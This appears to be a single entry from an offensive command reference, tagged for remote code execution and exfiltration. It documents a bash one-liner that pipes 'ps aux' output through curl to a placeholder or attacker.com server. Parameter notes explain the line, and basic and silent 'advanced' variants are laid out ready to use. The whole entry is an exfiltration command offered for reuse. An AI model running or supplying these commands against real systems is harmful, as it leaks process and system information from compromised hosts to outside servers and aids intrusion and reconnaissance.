---
id: c2e3f4g5-h6i7-8902-def0-123456789012
data: 'ps aux|curl http://<your-server> -d @-'
tags:
  - rce
  - exfiltration
type: command
output: HTTP POST request to <your-server> with 'ps aux' output in body
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:14.490Z'
verified: false
validated: true
submitted: true
---
# ps aux|curl http://<your-server> -d @-

## Command

```bash
ps aux|curl http://<your-server> -d @-
```

## Description

Pipes the output of 'ps aux' to curl, which sends it as POST data to an attacker-controlled server, demonstrating data exfiltration in an RCE scenario.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://<your-server> | Target URL for exfiltration | Yes |
| -d | Send data in POST body | Yes |
| @- | Read from stdin (piped input) | Yes |

## Examples

### Basic Usage

```bash
ps aux|curl http://attacker.com/exfil -d @-
```

### Advanced Usage

```bash
ps aux|curl -X POST http://attacker.com/exfil -d @- --silent
```

## Expected Output

Curl sends a POST request with process list in the body; server receives raw text output.

## Related

- [[commands/ps-aux]]
